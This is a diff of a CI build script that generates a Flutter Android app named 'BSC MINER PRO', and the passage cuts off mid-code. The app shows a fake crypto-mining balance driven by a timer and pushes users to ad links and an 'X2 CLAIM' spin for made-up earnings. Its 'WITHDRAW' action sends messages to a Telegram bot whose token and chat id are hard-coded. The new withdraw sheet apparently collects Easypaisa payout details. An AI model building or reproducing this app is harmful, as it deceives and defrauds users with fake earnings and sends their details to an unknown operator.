@@ -6,18 +6,17 @@ workflows:
     environment:
       flutter: 3.22.3
     scripts:
-      - name: FAST BUILD NO SDK DOWNLOAD
+      - name: PRO MAX BUILD
         script: |
-          flutter --version
-          flutter create --platforms=android . --overwrite
+          flutter create --platforms=android --org com.bscminer.app . --overwrite
           mkdir -p assets
-          echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > assets/icon.png
+          printf 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=' | base64 -d > assets/icon.png
           cat > pubspec.yaml << 'YAML'
           name: bsc_miner_pro
-          version: 3.0.2+13
+          version: 5.0.0+20
           publish_to: none
           environment:
-            sdk: ">=3.0.0 <4.0.0"
+            sdk: ">=3.2.0 <4.0.0"
           dependencies:
             flutter:
               sdk: flutter
@@ -25,15 +24,17 @@ workflows:
             http: ^1.2.2
           flutter:
             uses-material-design: true
+            assets:
+              - assets/icon.png
           YAML
+          mkdir -p lib
           cat > lib/main.dart << 'DART'
           import 'dart:async';import 'dart:math';import 'package:flutter/material.dart';import 'package:url_launcher/url_launcher.dart';import 'package:http/http.dart' as http;
-          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,home:Pro()));
-          class Pro extends StatefulWidget{State createState()=>_P();}
-          class _P extends State<Pro>{double b=0.0054;bool m=true;final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';void initState(){super.initState();Timer.periodic(Duration(milliseconds:100),(t){if(m)setState(()=>b+=0.0000003);});}
-          Widget build(c){return Scaffold(backgroundColor:Color(0xFF0B0E11),appBar:AppBar(title:Text('BSC MINER PRO'),backgroundColor:Colors.black),body:Column(children:[SizedBox(height:40),Text('\$${b.toStringAsFixed(7)}',style:TextStyle(fontSize:42,fontWeight:FontWeight.w900,color:Color(0xFFFCD535))),SizedBox(height:20),ElevatedButton(onPressed:()async{await launchUrl(Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f'),mode:LaunchMode.externalApplication);setState(()=>b+=0.0002);},child:Text('WATCH AD +\$0.0002')),ElevatedButton(onPressed:(){var u=Uri.parse("https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat&text=WITHDRAW \$${b.toStringAsFixed(4)}");http.get(u);},child:Text('WITHDRAW'))])));}}
-          DART
-          flutter pub get
-          flutter build apk --release --no-tree-shake-icons
-    artifacts:
-      - build/app/outputs/flutter-apk/app-release.apk
+          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,theme:ThemeData.dark().copyWith(scaffoldBackgroundColor:Color(0xFF0B0E11)),home:Pro()));
+          class Pro extends StatefulWidget{@override State<Pro> createState()=>_S();}
+          class _S extends State<Pro> with TickerProviderStateMixin{
+          double bal=0.0054073;int spins=5;bool mining=true;late AnimationController ac;final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';final ad='https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f';
+          @override void initState(){super.initState();ac=AnimationController(vsync:this,duration:Duration(milliseconds:800))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:85),(t){if(mining&&mounted)setState(()=>bal+=0.00000024);});}
+          Future<void> goAd(double r)async{await launchUrl(Uri.parse(ad),mode:LaunchMode.externalApplication);if(mounted)setState(()=>{bal+=r,spins++,mining=true});}
+          void spin(){if(spins<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad for Spin!')));return;}double w=[0.0003,0.0008,0.0015,0.0025][Random().nextInt(4)];setState(()=>{bal+=w,spins--});showDialog(context:context,builder:(_)=>AlertDialog(backgroundColor:Color(0xFF1E2329),shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(20)),title:Column(children:[Icon(Icons.stars,color:Color(0xFFFCD535),size:50),Text('YOU WON!',style:TextStyle(fontWeight:FontWeight.w900))]),content:Text('\$${w.toStringAsFixed(5)}',textAlign:TextAlign.center,style:TextStyle(fontSize:28,fontWeight:FontWeight.w900,color:Color(0xFFFCD535))),actions:[TextButton(onPressed:()=>Navigator.pop(context),child:Text('Collect')),ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFFCD535),foregroundColor:Colors.black),onPressed:(){Navigator.pop(context);goAd(w);},child:Text('X2 CLAIM'))]));}
+          void wd(){TextEditingController c=TextEditingController();String m='Easypaisa';showModalBottomSheet(context:context,isScrollControlled:true,backgroundColor:Color(0xFF181A20),shape:RoundedRectangleBorder(borderRadius:BorderRadius.vertical(top:Radius.circular(28))),builder:(x)=>StatefulBuilder(builder:(a,s)=>Padding(padding:EdgeInsets.fromLTRB(20,20,20,MediaQuery.of(a).viewInsets.bottom+20),child:Column(mainAxisSize:MainAxisSize.min,children:[Container(width:40,height:4,decoration:BoxDecoration(color:Colors.white24,borderRadius:BorderRadius.circular(2))),SizedBox(height:16),Text('Withdraw Profit',style:TextStyle(fontSize:22,fontWeight:FontWeight.w900)),SizedBox(height:12),Container(padding:EdgeInsets.all(12),decoration:BoxDecoration(color:Color(0xFFFCD535).withOpacity(0.1),borderRadius:BorderRadius.circular(12),border:Border.all(color:Color(0xFFFCD535).withOpacity(0.3))),child:Row(children:[Text('Available: ',style:TextStyle(color:Colors.white54)),Text('\$${bal.toStringAsFixed(7)}',style:TextStyle(color:Color(0xFFFCD535),fontWeight:FontWeight.bold))])),SizedBox(height:12),DropdownButtonFormField(value:m,dropdownColor:Color(0xFF1E2329),
